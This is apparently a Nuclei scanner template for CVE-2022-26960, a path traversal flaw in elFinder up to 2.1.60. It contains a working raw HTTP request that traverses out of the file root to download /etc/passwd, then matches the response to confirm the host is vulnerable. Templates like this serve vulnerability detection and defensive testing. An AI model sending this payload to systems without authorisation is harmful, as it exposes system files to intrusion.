id: CVE-2022-26960
info:
  author: pikpikcu
  classification:
    cve-id: CVE-2022-26960
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
    cwe-id: CWE-22
  description: 'elFinder through 2.1.60 is affected by local file inclusion via connector.minimal.php.
    This allows unauthenticated remote attackers to read, write, and browse files
    outside the configured document root. This is due to improper handling of absolute
    file paths.

    '
  metadata:
    verified: true
  name: elFinder <=2.1.60 - Local File Inclusion
  reference:
  - https://www.synacktiv.com/publications/elfinder-the-story-of-a-repwning.html
  - https://github.com/Studio-42/elFinder/commit/3b758495538a448ac8830ee3559e7fb2c260c6db
  - https://www.synacktiv.com/publications.html
  - https://nvd.nist.gov/vuln/detail/CVE-2022-26960
  severity: critical
  tags: cve,cve2022,lfi,elfinder
requests:
- matchers:
  - regex:
    - 'root:.*:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /elfinder/php/connector.minimal.php?cmd=file&target=l1_<@base64>/var/www/html/elfinder/files//..//..//..//..//..//../etc/passwd<@/base64>&download=1
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    '
